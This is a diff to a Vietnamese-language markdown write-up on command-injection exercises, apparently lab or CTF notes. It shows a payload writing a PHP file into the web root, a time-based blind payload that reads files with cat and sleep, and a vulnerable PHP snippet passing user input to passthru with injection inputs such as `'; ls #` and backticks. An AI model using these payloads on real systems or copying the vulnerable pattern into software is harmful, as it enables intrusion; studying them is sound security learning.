@@ -75,7 +75,30 @@ Cách khai thác: `; echo '<?php phpinfo(); ?>' > /var/www/html/test.php ;`
 
 ### Example 6, 7
 
-có thể thao túng giá trị trả về bởi câu lệnh if. payload `q /etc/passwd;if [ "$(cat /* | cut -c 1)" = "C" ]; then sleep 5; fi #`
+Có thể thao túng giá trị trả về bởi câu lệnh if. payload `q /etc/passwd;if [ "$(cat /* | cut -c 1)" = "C" ]; then sleep 5; fi #`
+
+### Example 8
+
+```
+$input = addslashes($input);
+$username = $input;
+
+$cowsay = <<<EOF
+echo 'Hello $username' | cowsay -f eyes -n
+EOF;
+
+passthru($cowsay);
+
+```
+
+Biến $username được chèn dấu backlash trước khi thực hiện các câu lệnh tiếp theo. 
+
+Khai thác: `'; ls #`. 
+
+Trường hợp: `echo 'Hello $username' | cowsay -n ; figlet "Hello $username"`
+
+Khai thác dựa trên dấu "", chương trình không filter dấu backtick --> ``ls``.
+
 
 
 
